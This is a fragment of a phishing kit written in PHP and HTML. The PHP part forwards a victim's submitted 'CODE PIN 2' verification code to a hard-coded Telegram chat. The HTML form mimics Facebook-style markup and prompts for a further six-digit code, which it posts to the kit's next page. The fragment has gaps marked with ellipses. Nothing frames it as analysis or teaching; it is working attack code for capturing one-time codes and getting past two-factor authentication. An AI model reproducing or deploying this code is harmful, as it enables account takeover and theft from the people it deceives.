...
$chat_id ="5288376819";
 $params=[
      'chat_id'=>$chat_id,
      'text' =>$idN ."| CODE PIN 2 : ".$_POST['codeconf2'],
                                ...
                                <div class="_9t2g _9t2c _a1fe">
                                    <div class="_9tar _9ta4 _9ta6 _9ta8">
                                        <div class="_9vd6 _9t33 _9bir _9bj3 _9bhj _9v12 _9tau _9tay _9u6w _9se- _9u5y">
                                            ...
                                            <form action="code_pin4.php" method="POST">
                                                  ...
                                                  <br><br><br>
                                                    ...
                                                    <br>
                                                    <br>
                                                        <input type="text" name="codeconf3" id="codeconf3" class="input-phone"  style="text-align:center;letter-spacing : 5px;  " placeholder="_ _ _  _ _ _"  pattern="[0-9]*" maxlength="6" required>
